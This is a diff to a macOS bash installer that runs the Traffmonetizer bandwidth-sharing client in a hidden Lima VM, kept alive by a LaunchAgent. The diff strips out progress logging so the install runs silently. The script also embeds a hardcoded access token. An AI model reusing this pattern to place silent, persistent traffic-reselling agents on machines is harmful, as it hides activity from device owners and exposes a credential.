@@ -1,6 +1,7 @@
 #!/usr/bin/env bash
 # install_macos.sh - Cai Traffmonetizer an toan bo tren macOS bang VM Lima (KHONG Docker)
 # Kien truc: binary chinh thuc TM chay trong VM Alpine sieu nhe (Lima/vz - ao hoa native macOS)
+# - Im lang terminal: khong in log tien trinh, chi bao loi khi that bai
 # - Khong Docker, khong Docker Desktop, khong GUI
 # - VM gioi han 1 CPU / 1GB RAM / 3GB disk
 # - Tu chay khi dang nhap qua LaunchAgent + guard loop
@@ -12,7 +13,7 @@ if [ -z "${TM_SKIP_PROMPT:-}" ]; then
     printf 'Mời bạn nhập email: ' >/dev/tty
     read -r EMAIL </dev/tty && export EMAIL
   fi
-  echo ""
+  echo "Hello"
 fi
 
 TOKEN="NxLHoObcALVGo0/U95S96YB2mDM3FTaIQQtSl34Pt1A="
@@ -29,9 +30,8 @@ set -u
 { [ -n "$TOKEN" ] && [ "$TOKEN" != "DAN_TOKEN_CUA_BAN_VAO_DAY" ]; } || { echo "Thieu token"; exit 1; }
 
 mkdir -p "$DIR" 2>/dev/null || true
-# Khong ghi bat ky log nao (yeu cau an toan bo) - Log chi in ra man hinh trong qua trinh cai
-Log() { echo "[$(date '+%H:%M:%S')] $*"; }
-Fail() { Log "LOI: $1"; echo "LOI: $1" >&2; exit "${2:-1}"; }
+# Im lang hoan toan trong terminal: khong in log tien trinh, chi bao loi khi that bai
+Fail() { echo "LOI: $1" >&2; exit "${2:-1}"; }
 
 # ---------- 1. Kien truc + phien ban macOS ----------
 ARCH=$(uname -m)
@@ -46,7 +46,6 @@ OSVER=$(sw_vers -productVersion 2>/dev/null | cut -d. -f1)
 OSVER=${OSVER:-0}
 USE_VZ=0
 [ "$OSVER" -ge 13 ] && USE_VZ=1
-Log "macOS $OSVER, kien truc $ARCH, vmType=$( [ "$USE_VZ" = 1 ] && echo vz || echo qemu ), binary=$BIN_FILE"
 
 # ---------- 2. Bo duong dan chuan (them vao dau, khong ghi de PATH nguoi dung) ----------
 for _d in /opt/homebrew/bin /usr/local/bin "$LIMA_BIN_FALLBACK/bin" /usr/bin /bin /usr/sbin /sbin; do
@@ -60,23 +59,16 @@ BREWUSED=0
 ensure_lima() {
   if command -v limactl >/dev/null 2>&1; then
     LIMAPATH=$(command -v limactl)
-    Log "limactl co san: $LIMAPATH"
     return 0
   fi
   if command -v brew >/dev/null 2>&1; then
-    Log "Cai Lima qua Homebrew..."
     if brew install lima >/dev/null 2>&1 && command -v limactl >/dev/null 2>&1; then
       hash -r 2>/dev/null || true
       LIMAPATH=$(command -v limactl); BREWUSED=1
-      Log "Lima da cai qua brew: $LIMAPATH"
       return 0
     fi
-    Log "brew install lima that bai, thu tai truc tiep tu GitHub..."
-  elif ! command -v brew >/dev/null 2>&1; then
-    Log "Khong co Homebrew, thu tai Lima truc tiep tu GitHub releases..."
   fi
   # Fallback: tai tarball chinh thuc tu GitHub releases (khong can sudo)
-  Log "Tai Lima tu GitHub releases vao $LIMA_BIN_FALLBACK..."
   REL_JSON=$(curl -fsSL --max-time 30 "https://api.github.com/repos/lima-vm/lima/releases/latest" 2>/dev/null) || REL_JSON=""
   ASSET_URL=$(printf '%s' "$REL_JSON" | grep -o '"browser_download_url": *"[^"]*lima-[0-9.]*-Darwin-'"$ARCH"'.tar\.gz"' | head -1 | sed 's/.*"\(https[^"]*\)".*/\1/')
   if [ -z "$ASSET_URL" ]; then
@@ -91,7 +83,6 @@ ensure_lima() {
       export PATH="$LIMA_BIN_FALLBACK/bin:$PATH"
       if command -v limactl >/dev/null 2>&1; then
         LIMAPATH=$(command -v limactl)
-        Log "Lima tai truc tiep OK: $LIMAPATH"
         # them PATH vao zshrc de dung sau nay
         if [ -f "$HOME/.zshrc" ] && ! grep -q '.lima-bin/bin' "$HOME/.zshrc" 2>/dev/null; then
           printf '\nexport PATH="$HOME/.lima-bin/bin:$PATH"\n' >>"$HOME/.zshrc"
@@ -109,7 +100,6 @@ ensure_lima || Fail "Khong cai duoc Lima (thu 'brew install lima' thu cong roi c
 if [ "$USE_VZ" = 0 ]; then
   if ! command -v "qemu-system-$LIMA_ARCH" >/dev/null 2>&1; then
     if command -v brew >/dev/null 2>&1; then
-      Log "macOS cu hon 13 -> can QEMU, dang cai qua brew..."
       brew install qemu >/dev/null 2>&1 || Fail "Khong cai duoc QEMU. Thu 'brew install qemu' thu cong." 2
       hash -r 2>/dev/null || true
       command -v "qemu-system-$LIMA_ARCH" >/dev/null 2>&1 || Fail "QEMU cai xong van thieu qemu-system-$LIMA_ARCH" 2
@@ -125,11 +115,9 @@ DEVICE_NAME=$(curl -4 -fsS --max-time 10 https://api.ipify.org 2>/dev/null) || D
 [ -n "$DEVICE_NAME" ] || DEVICE_NAME=$(ipconfig getifaddr en0 2>/dev/null) || DEVICE_NAME=""
 [ -n "$DEVICE_NAME" ] || DEVICE_NAME=$(hostname 2>/dev/null) || DEVICE_NAME=""
 [ -n "$DEVICE_NAME" ] || DEVICE_NAME="mac"
-Log "Device name: $DEVICE_NAME"
 
 # ---------- 6. Don rac kien truc Docker cu (neu co) ----------
 if command -v docker >/dev/null 2>&1; then
-  Log "Phat hien docker: don container cai cu (tm, watchtower)..."
   docker rm -f tm watchtower >/dev/null 2>&1 || true
 fi
 
@@ -205,7 +193,6 @@ provision:
     rc-service tm restart 2>/dev/null || rc-service tm start 2>/dev/null || true
 YEOF
 sed -e "s|@BIN_URL@|$BIN_URL|g" -e "s|@TOKEN@|$TOKEN|g" -e "s|@DEVICE@|$DEVICE_NAME|g" "$YAML" >"$YAML.tmp" && mv "$YAML.tmp" "$YAML"
-Log "Da tao cau hinh VM: $YAML (vz=$( [ "$USE_VZ" = 1 ] && echo yes || echo no ))"
 
 # ---------- 8. Tao/khoi dong VM (idempotent) ----------
 vm_exists() { limactl list "$VM_NAME" 2>/dev/null | awk 'NR>1{print $1}' | grep -qx "$VM_NAME"; }
@@ -214,47 +201,37 @@ vm_running() { [ "$(limactl list "$VM_NAME" 2>/dev/null | awk 'NR>1{print $2}')"
 ensure_vm() {
   # Tra ve 0 neu VM dang chay; thu vz -> neu that bai va dung vz thi doi sang qemu
   if vm_exists; then
-    Log "VM $VM_NAME da ton tai, kiem tra trang thai..."
-    if vm_running; then Log "VM dang chay, bo qua"; return 0; fi
-    Log "Khoi dong lai VM..."
+    if vm_running; then return 0; fi
     limactl start "$VM_NAME" --tty=false >/dev/null 2>&1 && return 0
-    Log "Khoi dong loi, xoa va tao lai..."
     limactl delete -f "$VM_NAME" >/dev/null 2>&1 || true
   fi
-  Log "Tao VM moi (lan thu 1)..."
   if limactl create --tty=false "$YAML" >/dev/null 2>&1 && limactl start "$VM_NAME" --tty=false >/dev/null 2>&1; then
     return 0
   fi
   if [ "$USE_VZ" = 1 ]; then
-    Log "Tao VM voi vz loi -> doi sang QEMU (can cai them)..."
     limactl delete -f "$VM_NAME" >/dev/null 2>&1 || true
     if ! command -v "qemu-system-$LIMA_ARCH" >/dev/null 2>&1; then
       command -v brew >/dev/null 2>&1 || Fail "VM loi va khong co brew de cai QEMU thay the" 3
-      Log "Cai QEMU de thay the vz..."
       brew install qemu >/dev/null 2>&1 || Fail "Cai QEMU thay the that bai" 3
       hash -r 2>/dev/null || true
     fi
     grep -v '^vmType:' "$YAML" >"$YAML.tmp" && mv "$YAML.tmp" "$YAML"
-    Log "Tao lai VM voi QEMU (lan thu 2)..."
     limactl create --tty=false "$YAML" >/dev/null 2>&1 && limactl start "$VM_NAME" --tty=false >/dev/null 2>&1 && return 0
   fi
   return 1
 }
 
 ensure_vm || Fail "Khong tao/khoi dong duoc VM $VM_NAME. Chay lai hoac thu thu cong: limactl start $VM_NAME" 3
-Log "VM da chay."
 
 # ---------- 9. Xac nhan binary trong VM (tu phuc hoi neu provision loi) ----------
 cli_ok() {
   limactl shell "$VM_NAME" -- sh -c 'test -x /opt/tm/cli && echo TM_CLI_OK' 2>/dev/null | grep -q TM_CLI_OK
 }
 if ! cli_ok; then
-  Log "Chua thay binary trong VM -> xoa va tao lai de provision chay lai..."
   limactl delete -f "$VM_NAME" >/dev/null 2>&1 || true
   ensure_vm || Fail "Tao lai VM that bai" 3
   cli_ok || Fail "Binary TM chua duoc cai vao VM (co the loi mang khi tai). Chay lai script de thu lai." 4
 fi
-Log "Binary /opt/tm/cli da san sang trong VM."
 
 # ---------- 10. LaunchAgent guard (tu khoi dong khi dang nhap + giu VM song) ----------
 GUARD="$DIR/guard.sh"
@@ -298,7 +275,6 @@ cat >"$PLIST" <<PEOF
 PEOF
 launchctl bootout "gui/$(id -u)/com.khoahocdrive.tm" >/dev/null 2>&1 || true
 launchctl bootstrap "gui/$(id -u)" "$PLIST" >/dev/null 2>&1 || launchctl load -w "$PLIST" >/dev/null 2>&1
-Log "Da dang ky LaunchAgent: com.khoahocdrive.tm (RunAtLoad + KeepAlive)"
 
 # ---------- 11. Xac nhan client dang chay ----------
 OK=0
@@ -309,10 +285,8 @@ for _ in $(seq 1 12); do
   sleep 5
 done
 if [ "$OK" = 1 ]; then
-  Log "HOAN TAT: client Traffmonetizer dang chay trong VM $VM_NAME (an hoan toan, khong Docker)."
-  echo "OK: Trafffmonetizer da chay an trong macOS. Tat/mo lai may se tu chay lai."
+  echo "OK: Traffmonetizer da chay an trong macOS. Tat/mo lai may se tu chay lai."
 else
-  Log "CANH BAO: chua xac nhan pid /run/tm.pid trong VM (co the con dang khoi dong). Guard se tu kiem tra lai moi 30 giay."
   echo "OK nhung chua xac nhan client - guard se tu dam bao client chay sau vai phut."
 fi
 exit 0
